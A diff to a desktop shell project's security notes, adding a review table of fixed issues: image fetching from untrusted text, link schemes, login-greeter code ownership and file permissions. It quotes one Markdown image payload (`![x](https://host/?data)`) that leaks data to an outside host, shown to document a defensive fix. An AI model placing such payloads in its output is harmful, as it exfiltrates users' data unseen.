@@ -1,6 +1,21 @@
 # Security notes (kuwai / rice shell)
 
-Last reviewed: 2026-11-05.
+Last reviewed: 2026-11-17.
+
+## 2026-11-17 review
+
+| Area | What was wrong | Now |
+|------|----------------|-----|
+| **Text from outside** | Qt's `Text` treats a string that looks like HTML as HTML and fetches any `<img>` in it (checked on Qt 6.12: default `Text`, `StyledText`, `TextEdit` Markdown and RichText all made the request). A song or tab title on the screensaver, a device name in the HUD, tool output and model reasoning in the assistant reached such elements | Every `Text` with outside text says `textFormat: Text.PlainText` (103 elements); `tests/security/test_text_format.py` fails CI on a new one |
+| **Streaming answers** | The live block of an answer went to Qt's Markdown reader as written: `![x](https://host/?data)` was fetched as it arrived | `Turn.liveMarkdown`: an image becomes a link, raw HTML shows as text (`turn.test.mjs`) |
+| **Links** | A link in an answer or a copied text was opened whatever its scheme | The web and mail only (`Turn.safeLink`, `rice_md.py`, Quick Look) |
+| **Login screen** | `/var/lib/kuwai-greeter` was the user's, and `greeter/sync` copied the shell into it at every login: a program running as you could rewrite the code that takes the login password | The code is root's (`sudo greeter/install`, `--code` after an update); you write only `home/` (wallpaper, colours, settings, name, face). **Needs one `sudo greeter/install --code`** on a machine installed before this date; until then sync keeps the old layout working and says so |
+| **Login screen, undo** | `--undo` didn't put PAM, greetd's config or tty1's override back, and assumed SDDM | What was replaced is kept in `/var/lib/kuwai-greeter/original` and restored |
+| **State on disk** | Notification bodies and chats were written 0644 | `~/.local/state/rice`, `~/.cache/rice`, `~/.config/rice` are 0700 at every shell start |
+
+Still open: the assistant's tool execution has not had an outside review; the
+root updater installs its helper from the repo copy on first use (the prompt
+shows `/bin/sh`); nothing here replaces disk encryption (see the audit notes).
 
 ## Fixed / hardened in this track
 
